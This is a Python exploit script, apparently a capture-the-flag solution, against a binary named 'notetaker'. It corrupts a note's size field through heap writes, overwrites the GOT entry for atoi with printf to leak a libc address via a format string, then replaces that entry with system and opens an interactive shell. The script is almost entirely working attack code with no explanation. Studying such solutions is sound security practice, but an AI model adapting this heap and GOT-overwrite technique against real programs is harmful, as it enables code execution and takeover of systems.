from ptrlib import *

def add(title_size, title, desc_size, desc):
    sock.sendlineafter("> ", "1")
    sock.sendlineafter(": ", str(title_size))
    sock.sendafter(": ", title)
    sock.sendlineafter(": ", str(desc_size))
    sock.sendafter(": ", desc)
    return

def edit(index, title, desc):
    sock.sendlineafter("> ", "2")
    sock.sendlineafter(": ", str(index))
    sock.sendafter(": ", title)
    sock.sendafter(": ", desc)
    return

def delete(index):
    sock.sendlineafter("> ", "4")
    sock.sendlineafter(": ", str(index))
    return

elf = ELF("./notetaker")
libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
sock = Process("./notetaker")
#libc = ELF("./libc.so.6")
#sock = Socket("localhost", 9999)

# libc leak
for i in range(12):
    add(0x10, "A", 0x60, "B")
add(0x10, "B", 0x60, "B") # this will make size[1] very big
edit(1, b"A"*0x20 + p64(elf.got('atoi')) + p64(0x10), p64(elf.plt('printf')) + b'\x00')
sock.sendafter("> ", "%3$p\n\n")
libc_base = int(sock.recvline(), 16) - libc.symbol("read") - 17
print("libc base = " + hex(libc_base))

# got overwrite
sock.sendlineafter("> ", "AA") # edit
sock.sendlineafter(": ", "A")
sock.sendafter(": ", b"A"*0x20 + p64(elf.got('atoi')) + p64(0x10))
sock.sendafter(": ", p64(libc_base + libc.symbol("system")) + b'\x00')

sock.interactive()
